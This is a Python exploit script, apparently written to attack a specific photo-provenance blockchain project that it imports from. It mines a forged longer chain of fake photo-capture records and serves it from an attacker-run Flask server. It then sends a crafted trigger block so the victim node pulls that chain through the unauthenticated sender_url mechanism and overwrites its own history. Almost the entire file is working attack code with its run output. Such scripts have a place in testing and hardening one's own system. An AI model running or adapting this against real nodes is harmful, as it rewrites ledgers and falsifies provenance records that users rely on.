#!/usr/bin/env python3
"""
Attack 1: Forge a Longer Chain (Chain Replacement Attack)

Exploits:
  - DIFFICULTY_BITS = 4 means prefix = 4//4 = 1, only one leading '0' required.
    A modern CPU can mine a block in milliseconds.
  - /api/block endpoint accepts blocks with sender_url; on validation failure
    the victim pulls the full chain from sender_url and replaces its own if longer.
  - No authentication on any peer API endpoint.

Strategy:
  1. Fetch the victim's current chain via GET /api/blocks
  2. Fork from genesis and mine a longer chain locally with attacker-controlled
     transactions (e.g., fake CAPTURE records with tampered photo hashes)
  3. Start a temporary HTTP server that serves the forged chain
  4. Send a crafted /api/block to the victim with sender_url pointing to our server
  5. The victim's receive_block fails validation (fork), pulls our longer chain,
     and replaces its own chain

Result: The victim's entire blockchain history is rewritten.
"""

import argparse
import hashlib
import json
import threading
import time
import sys
import os

import requests
from flask import Flask, jsonify

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from blockchain.block import Block
from blockchain.transaction import Transaction
from blockchain.merkle import merkle_root
from blockchain.mining import _meets_difficulty
from config import GENESIS_HASH, TX_COINBASE, TX_CAPTURE, DIFFICULTY_BITS


def forge_chain(num_blocks: int, attacker_pubkey: str, tampered_records: list[dict] | None = None):
    """Build a valid chain from genesis with attacker-controlled content."""
    genesis = Block(
        index=0,
        previous_hash=GENESIS_HASH,
        transactions=[],
        timestamp=0.0,
        nonce=0,
        miner="genesis",
    )
    chain = [genesis]

    tampered_records = tampered_records or []

    for i in range(1, num_blocks + 1):
        prev = chain[-1]
        coinbase = Transaction.make_coinbase(attacker_pubkey)

        txs = [coinbase]
        if i - 1 < len(tampered_records):
            rec = tampered_records[i - 1]
            fake_capture = Transaction(
                tx_type=TX_CAPTURE,
                sender=attacker_pubkey,
                payload=rec,
                timestamp=time.time(),
            )
            txs.append(fake_capture)

        candidate = Block(
            index=i,
            previous_hash=prev.hash,
            transactions=txs,
            timestamp=time.time(),
            nonce=0,
            miner=attacker_pubkey,
        )

        difficulty = DIFFICULTY_BITS
        prefix = difficulty // 4
        nonce = 0
        while True:
            candidate.nonce = nonce
            candidate.hash = candidate.compute_hash()
            if candidate.hash.startswith("0" * prefix):
                break
            nonce += 1

        chain.append(candidate)

    return chain


def serve_chain(chain: list[Block], port: int):
    """Start a temporary Flask server that serves the forged chain."""
    app = Flask(__name__)
    chain_data = [blk.to_dict() for blk in chain]

    @app.route("/api/blocks", methods=["GET"])
    def get_blocks():
        return jsonify({"chain": chain_data}), 200

    @app.route("/api/health", methods=["GET"])
    def health():
        return jsonify({"status": "ok"}), 200

    app.run(host="0.0.0.0", port=port, debug=False)


def trigger_chain_replacement(target_url: str, attacker_serve_url: str, fake_block: Block):
    """Send a block to the victim that will fail validation and trigger chain pull."""
    payload = {
        "block": fake_block.to_dict(),
        "ttl": 0,
        "msg_id": hashlib.sha256(str(time.time()).encode()).hexdigest()[:16],
        "sender_url": attacker_serve_url,
    }
    try:
        resp = requests.post(f"{target_url}/api/block", json=payload, timeout=10)
        return resp.status_code, resp.json()
    except Exception as e:
        return None, str(e)


def main():
    parser = argparse.ArgumentParser(description="Attack 1: Forge a longer chain")
    parser.add_argument("--target", required=True, help="Victim peer URL, e.g. http://192.168.1.100:8001")
    parser.add_argument("--blocks", type=int, default=20, help="Number of blocks to forge (must exceed victim's chain)")
    parser.add_argument("--serve-port", type=int, default=9999, help="Port to serve the forged chain")
    parser.add_argument("--attacker-ip", default="0.0.0.0", help="Attacker IP visible to victim")
    args = parser.parse_args()

    attacker_pubkey = "aa" * 32
    attacker_serve_url = f"http://{args.attacker_ip}:{args.serve_port}"

    print(f"[*] Fetching victim's current chain from {args.target}...")
    try:
        resp = requests.get(f"{args.target}/api/blocks", timeout=5)
        victim_chain = resp.json().get("chain", [])
        print(f"[*] Victim chain height: {len(victim_chain)}")
    except Exception as e:
        print(f"[!] Could not reach victim: {e}")
        return

    forge_count = max(args.blocks, len(victim_chain) + 5)
    print(f"[*] Forging {forge_count} blocks (must be > {len(victim_chain)})...")

    tampered_records = [
        {
            "device_id": "attacker-device-001",
            "image_hash": hashlib.sha256(f"tampered-photo-{i}".encode()).hexdigest(),
            "phash": "0" * 16,
            "location": "attacker-lab",
        }
        for i in range(forge_count)
    ]

    start = time.time()
    forged_chain = forge_chain(forge_count, attacker_pubkey, tampered_records)
    elapsed = time.time() - start
    print(f"[+] Forged {forge_count} blocks in {elapsed:.2f}s")
    print(f"[+] Forged chain tip hash: {forged_chain[-1].hash[:16]}...")

    print(f"[*] Starting chain server on port {args.serve_port}...")
    server_thread = threading.Thread(
        target=serve_chain,
        args=(forged_chain, args.serve_port),
        daemon=True,
    )
    server_thread.start()
    time.sleep(1)

    trigger_block = Block(
        index=len(victim_chain),
        previous_hash="0" * 64,
        transactions=[Transaction.make_coinbase(attacker_pubkey)],
        timestamp=time.time(),
        nonce=0,
        miner=attacker_pubkey,
    )

    print(f"[*] Sending trigger block to {args.target}/api/block ...")
    print(f"[*] sender_url = {attacker_serve_url}")
    status, body = trigger_chain_replacement(args.target, attacker_serve_url, trigger_block)
    print(f"[*] Response: status={status}, body={body}")

    time.sleep(2)
    try:
        resp = requests.get(f"{args.target}/api/blocks", timeout=5)
        new_chain = resp.json().get("chain", [])
        print(f"\n[*] Victim chain height after attack: {len(new_chain)}")
        if len(new_chain) >= forge_count:
            print("[+] SUCCESS: Victim's chain was replaced with our forged chain!")
            last_block = new_chain[-1]
            print(f"[+] Last block miner: {last_block.get('miner', 'unknown')}")
        else:
            print("[-] Chain replacement may have failed. Check manually.")
    except Exception as e:
        print(f"[!] Could not verify result: {e}")

    print("\n[*] Forged chain server still running. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Stopped.")


if __name__ == "__main__":
    main()
